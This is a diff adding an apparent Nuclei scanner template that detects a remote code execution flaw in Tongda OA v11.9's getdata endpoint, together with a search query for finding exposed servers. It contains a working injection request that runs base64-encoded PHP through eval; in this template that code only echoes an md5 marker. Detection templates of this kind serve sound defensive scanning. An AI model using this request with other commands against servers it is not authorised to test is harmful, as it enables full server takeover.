@@ -1,0 +1,35 @@
+id: tongda-getdata-rce
+
+info:
+  name: Tongda OA v11.9 getadata - Remote Code Execution
+  author: xc
+  severity: critical
+  description: |
+    There is an arbitrary command execution vulnerability in the getdata interface of Tongda OA v11.9. An attacker can execute arbitrary commands on the server to control server permissions through the vulnerability.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="TDXK-通达OA"
+  tags: tongda,rce
+variables:
+  num: '999999999'
+  payload: "echo md5({{num}});"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{{md5(num)}}'
+          - 'pagelimit'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a00463044022052a3d076ee938abd5208a2235f1d7fcc0504974f07ceb787a8858a155c963adf022054325d465d3a9c72e37fa962d213f3adaa04076860b3991f75ff809f001e2eeb:922c64590222798bb761d5b6d8e72950
